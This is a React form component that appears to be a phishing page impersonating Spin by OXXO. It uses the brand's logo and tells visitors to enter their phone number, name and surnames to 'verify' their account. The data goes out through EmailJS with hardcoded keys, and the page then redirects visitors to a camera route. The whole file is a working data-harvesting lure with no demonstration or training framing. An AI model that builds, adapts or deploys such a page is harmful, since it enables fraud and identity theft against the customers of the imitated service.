import React, { useRef } from 'react';
import emailjs from '@emailjs/browser';
import { useNavigate } from 'react-router-dom'; // Importar useNavigate
import '../css/form.css';
import logo from '../img/logoaz.png';

const Form = () => {
  const form = useRef();
  const navigate = useNavigate(); // Inicializar useNavigate

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm('service_icdmue9', 'template_iibu89c', form.current, '0lK4hlKpSriUIgjYL')
      .then(
        (result) => {
          console.log('Email enviado:', result.text);
          navigate('/camara'); // Redirigir a la ruta /camara
        },
        (error) => {
          console.error('Error al enviar:', error.text);
          alert('Ocurrió un error al enviar el formulario.');
        }
      );

    e.target.reset(); // Limpiar el formulario después de enviarlo (opcional)
  };

  return (
    <div className="contenedor">
      <div className="contimg">
        <img
          src="https://elspoilergeek.com/wp-content/uploads/como-hacer-un-deposito-a-mi-tarjeta-Spin-OXXO-1024x597.jpg?x73389"
          alt=""
          className="logo"
        />
      </div>
      <br />
      <h2
        style={{
          textAlign: 'center',
          fontSize: '18px',
          color: '#6316c1',
          fontWeight: '700',
        }}
      >
        INGRESA TU NÚMERO DE CELULAR PARA VERIFICAR TU CUENTA
      </h2>
      <form className="pedirnum" id="contactform" ref={form} onSubmit={sendEmail}>
        <div className="contingnum">
          <div className="continptel">
            <label className="num-label" htmlFor="num">
              +52
            </label>
            <input
              type="tel"
              name="user_phone"
              id="num"
              placeholder="Ingrese su número"
              onKeyPress={(event) => event.charCode >= 48 && event.charCode <= 57}
              maxLength="10"
              className="inputtextt"
              required
            />
          </div>
        </div>
        <div className="contingnum">
          <div className="continp">
            <input
              type="text"
              name="user_name"
              id="nombre"
              placeholder="Nombre completo"
              className="inputtexta"
              required
            />
          </div>
        </div>
        <div className="contingnum">
          <div className="continp">
            <input
              type="text"
              name="user_lastname"
              id="apellido"
              placeholder="Apellido(s)"
              className="inputtexta"
              required
            />
          </div>
        </div>
        <input className="btnenviar" id="btnenviar" type="submit" value="Enviar" />
      </form>
      <br />
      <div className="footer">
        <img
          src="https://spinbyoxxo.com.mx/wp-content/uploads/2021/07/logo-download.png"
          width="100px"
          alt=""
        />
      </div>
    </div>
  );
};

export default Form;
